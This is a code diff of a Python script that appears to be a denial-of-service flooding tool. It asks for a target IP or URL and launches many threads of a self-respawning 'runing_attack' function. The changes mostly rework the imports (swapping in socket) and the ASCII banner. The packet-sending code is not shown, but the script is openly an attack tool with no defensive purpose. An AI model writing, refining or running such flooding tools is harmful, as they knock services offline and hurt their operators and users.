@@ -1,15 +1,20 @@
-# -*- coding: utf-8 -*-    
-import requests
-import time
-import threading
-import string
-import random
-import os
-import platform
-import sys 
-from colorama import Fore, Style, init
-import logging
-# Inisialisasi Colorama dan logging
+# -*- coding: utf-8 -*-
+# CHECK IMPORT
+try:
+    import socket
+    import threading
+    import string
+    import random
+    import time
+    import os
+    import platform
+    import sys
+    from colorama import Fore
+except ModuleNotFoundError as e:
+    print(f"{e} CAN'T IMPORT . . . .")
+    exit()
+
+# DEF & CLASS
 
 def clear_text():
     if platform.system().upper() == "WINDOWS":
@@ -78,22 +83,20 @@ def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,boo
     else:
         threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
 
-# Fungsi untuk Menampilkan Header Zan dengan warna
-def display_header():
-    header_lines =[
-f"{Fore.YELLOW}                                        ",  
-f"{Fore.YELLOW}      mmmmmmmmmmmmmmm           / mmm    ", 
-f"{Fore.RED}        \_________     \          / mm mm   ",
-f"{Fore.RED}                 mm   /          / mm   mm   ",
-f"{Fore.YELLOW}             mm   /  ____    / mm  \  mm  ",
-f"{Fore.YELLOW}            mm   /  |mmm|   / mm    \  mm   ",
-f"{Fore.WHITE}            mm   /          / mmmmmmmmmmmmm  ",  
-f"{Fore.WHITE}           mm    mmmmmmmmmm/ mm ———————\  mm    ",
-f"{Fore.WHITE}                                                ",
-f"{Fore.YELLOW}                                                ",      
-]
-# Tampilkan header dengan warna
-    print(line)
+#DATA
+banner = f"""
+{Fore.YELLOW}   ::::::::::\          / :::     | :::  / ::
+{Fore.YELLOW}   \______:: /         / ::.::    | :: ::| ::
+{Fore.RED}            :: /         / :: \ ::   | ::\ :: ::
+{Fore.YELLOW}        :: /         / :::::::::  | :: \ :;::
+{Fore.WHITE}        ::::::::::   / ::     \ :: | ::  \ :::
+{Fore.WHITE}         \_________\ \___      \__  \__   \___
+ 
+{Fore.RED}╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐
+{Fore.LIGHTRED_EX}╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ 
+{Fore.WHITE}╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘  {Fore.YELLOW}# (OFFLINE) {Fore.LIGHTYELLOW_EX}TOOL #{Fore.RESET}"""
+
+print(banner)
 host = ""
 ip = ""
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
@@ -120,5 +123,6 @@ for loader_num in range(create_thread):
     threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
     threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
 clear_text()
+print(banner)
 status_code = True
 print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
